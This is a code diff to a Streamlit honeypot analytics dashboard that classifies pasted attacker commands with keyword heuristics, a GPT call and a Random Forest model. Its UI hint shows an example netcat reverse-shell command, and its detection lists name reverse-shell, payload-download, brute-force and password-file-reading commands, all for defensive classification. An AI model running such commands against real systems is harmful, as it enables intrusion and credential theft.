@@ -6,6 +6,7 @@ import joblib
 import openai
 import os
 from pathlib import Path
+import numpy as np
 
 # ---- Streamlit Page Setup ----
 st.set_page_config(page_title="AI-Powered Honeypot Analytics Dashboard", layout="wide")
@@ -29,7 +30,6 @@ st.dataframe(df)  # streamlit displays a scrollable table
 st.subheader("AI-Generated Report")
 if st.button("Generate AI Report (GPT-5)"):
     try:
-        # load OpenAI key from Streamlit secrets or environment
         openai_key = None
         if "OPENAI_API_KEY" in st.secrets:
             openai_key = st.secrets["OPENAI_API_KEY"]
@@ -41,10 +41,8 @@ if st.button("Generate AI Report (GPT-5)"):
         else:
             openai.api_key = openai_key
 
-            # ---- Local synopsis to reduce tokens ----
             attack_counts = df['attack_type'].value_counts().to_dict()
             threat_stats = df['threat_score'].describe().to_dict()
-            # choose top 5 coordinates (if present) or top countries column if it exists
             top_locations = []
             if {'geo_lat', 'geo_lon'}.issubset(df.columns):
                 top_locations = df[['geo_lat', 'geo_lon']].dropna().head(5).to_dict(orient='records')
@@ -66,13 +64,11 @@ if st.button("Generate AI Report (GPT-5)"):
                 "Output format: 1-paragraph summary, then exactly 5 bullets prefixed with '-'"
             )
 
-            # call GPT-5-mini (or gpt-5 model you have access to)
             response = openai.chat.completions.create(
                 model="gpt-5-mini",
                 messages=[{"role": "user", "content": prompt}]
             )
 
-            # access response text (GPT-5 responses use .message.content)
             ai_report = response.choices[0].message.content
             st.success("AI Report Generated:")
             st.markdown(ai_report)
@@ -115,73 +111,97 @@ if {'geo_lat', 'geo_lon'}.issubset(df.columns):
 else:
     st.info("No geo_lat/geo_lon columns available — skipping geo map.")
 
-# ---- Real-time Session Classification (local model / heuristic / optional GPT) ----
-st.subheader("Classify a New Session")
+# ---- Real-time Session Classification (Paste command) ----
+st.subheader("Classify a New Session (Paste Command)")
 st.markdown("Paste a single session command (e.g. `nc -e /bin/sh 10.10.10.5 4444` or `nmap -sS 192.168.1.0/24`)")
 
 session_input = st.text_area("Paste session command here:")
 
-if st.button("Classify"):
+if st.button("Classify Command"):
     st.info("Analyzing session...")
     session_txt = (session_input or "").strip()
     if not session_txt:
         st.warning("Please paste a session command to classify.")
     else:
-        model_path = Path("models/honeypot_model.pkl")  # recommended location in repo
-
-        # Try local ML model first
-        if model_path.exists():
-            try:
-                model = joblib.load(model_path)
-                from sklearn.feature_extraction.text import CountVectorizer
-                vect = CountVectorizer()
-                # NOTE: for demo only; in production use the same vectorizer used during training (saved pipeline)
-                X_demo = vect.fit_transform([session_txt])
-                pred = model.predict(X_demo)[0]
-                st.success(f"ML Model Prediction: {pred}")
-            except Exception as e:
-                st.error(f"Failed to run local ML model: {e}")
-
-        # Fallback heuristic classifier
+        cmd = session_txt.lower()
+        # Heuristic
+        if any(k in cmd for k in ["nmap", "masscan", "-sS", "-sV", " -p"]):
+            hpred = "Port Scan"
+        elif any(k in cmd for k in ["nc -e", "/bin/sh", "python -c", "bash -i", "reverse shell", "bash -c 'bash -i'"]):
+            hpred = "Reverse Shell"
+        elif any(k in cmd for k in ["wget ", "curl ", "http://", "https://", "ftp", "download"]):
+            hpred = "Malware Fetch / Payload Exec"
+        elif any(k in cmd for k in ["hydra", "john", "medusa", "sshpass", "brute force", "bruteforce"]):
+            hpred = "Brute Force"
+        elif any(k in cmd for k in ["grep password", "cat /etc/passwd", "id; uname", "ps aux", "whoami"]):
+            hpred = "Recon / Info Gathering"
         else:
-            cmd = session_txt.lower()
-            if any(k in cmd for k in ["nmap", "masscan", "-sS", "-sV", " -p"]):
-                hpred = "Port Scan"
-            elif any(k in cmd for k in ["nc -e", "/bin/sh", "python -c", "bash -i", "reverse shell", "bash -c 'bash -i'"]):
-                hpred = "Reverse Shell"
-            elif any(k in cmd for k in ["wget ", "curl ", "http://", "https://", "ftp", "download"]):
-                hpred = "Malware Fetch / Payload Exec"
-            elif any(k in cmd for k in ["hydra", "john", "medusa", "sshpass", "brute force", "bruteforce"]):
-                hpred = "Brute Force"
-            elif any(k in cmd for k in ["grep password", "cat /etc/passwd", "id; uname", "ps aux", "whoami"]):
-                hpred = "Recon / Info Gathering"
+            hpred = "Unknown / Other"
+        st.info(f"Heuristic Prediction: {hpred}")
+
+        # GPT Prediction
+        try:
+            openai_key = None
+            if "OPENAI_API_KEY" in st.secrets:
+                openai_key = st.secrets["OPENAI_API_KEY"]
+            elif os.getenv("OPENAI_API_KEY"):
+                openai_key = os.getenv("OPENAI_API_KEY")
+
+            if openai_key:
+                openai.api_key = openai_key
+                prompt = (
+                    "You are a cybersecurity analyst. Classify the following command into one label "
+                    "(Brute Force, Port Scan, Reverse Shell, Malware Fetch, Recon, Other). "
+                    f"Command: {session_txt}"
+                )
+                response = openai.chat.completions.create(
+                    model="gpt-3.5-turbo",
+                    messages=[{"role": "user", "content": prompt}]
+                )
+                gpred = response.choices[0].message.content.strip()
+                st.success(f"GPT Prediction: {gpred}")
             else:
-                hpred = "Unknown / Other"
+                st.info("OpenAI key not found — skipped GPT classification.")
+        except Exception as e:
+            st.warning(f"OpenAI call failed: {e}")
 
-            st.info(f"Heuristic Prediction: {hpred}")
+# ---- ML Section (Random Forest) ----
+st.subheader("Classify Uploaded or Generated Session Data (Random Forest)")
 
-            # Optional: ask OpenAI for a second opinion (only if key available)
-            try:
-                openai_key = None
-                if "OPENAI_API_KEY" in st.secrets:
-                    openai_key = st.secrets["OPENAI_API_KEY"]
-                elif os.getenv("OPENAI_API_KEY"):
-                    openai_key = os.getenv("OPENAI_API_KEY")
+# Upload CSV
+uploaded_file = st.file_uploader("Upload a CSV with session features", type="csv")
 
-                if openai_key:
-                    openai.api_key = openai_key
-                    prompt = (
-                        "You are a cybersecurity analyst. Classify the following command into one label "
-                        "(Brute Force, Port Scan, Reverse Shell, Malware Fetch, Recon, Other). "
-                        f"Command: {session_txt}"
-                    )
-                    response = openai.chat.completions.create(
-                        model="gpt-3.5-turbo",
-                        messages=[{"role": "user", "content": prompt}]
-                    )
-                    gpred = response.choices[0].message.content.strip()
-                    st.success(f"GPT Prediction: {gpred}")
-                else:
-                    st.info("OpenAI key not found — skipped GPT classification.")
-            except Exception as e:
-                st.warning(f"OpenAI call failed: {e}")
+if uploaded_file:
+    df_upload = pd.read_csv(uploaded_file)
+    model_path = Path("models/honeypot_model.pkl")
+    if model_path.exists():
+        model = joblib.load(model_path)
+        features = ['failed_logins','commands_count','has_url','payload_hash_present','geo_lat','geo_lon','threat_score']
+        if all(f in df_upload.columns for f in features):
+            preds = model.predict(df_upload[features])
+            df_upload['ML_Prediction'] = preds
+            st.dataframe(df_upload)
+        else:
+            st.error("CSV is missing required features")
+    else:
+        st.error("Random Forest model not found in models/honeypot_model.pkl")
+
+# Generate random data
+if st.button("Generate Random Session for ML Prediction"):
+    random_session = pd.DataFrame([{
+        'failed_logins': np.random.randint(0,5),
+        'commands_count': np.random.randint(0,10),
+        'has_url': np.random.randint(0,2),
+        'payload_hash_present': np.random.randint(0,2),
+        'geo_lat': np.random.uniform(-90,90),
+        'geo_lon': np.random.uniform(-180,180),
+        'threat_score': np.random.uniform(0,1)
+    }])
+    model_path = Path("models/honeypot_model.pkl")
+    if model_path.exists():
+        model = joblib.load(model_path)
+        pred = model.predict(random_session)[0]
+        random_session['ML_Prediction'] = pred
+        st.dataframe(random_session)
+    else:
+        st.error("Random Forest model not found in models/honeypot_model.pkl")
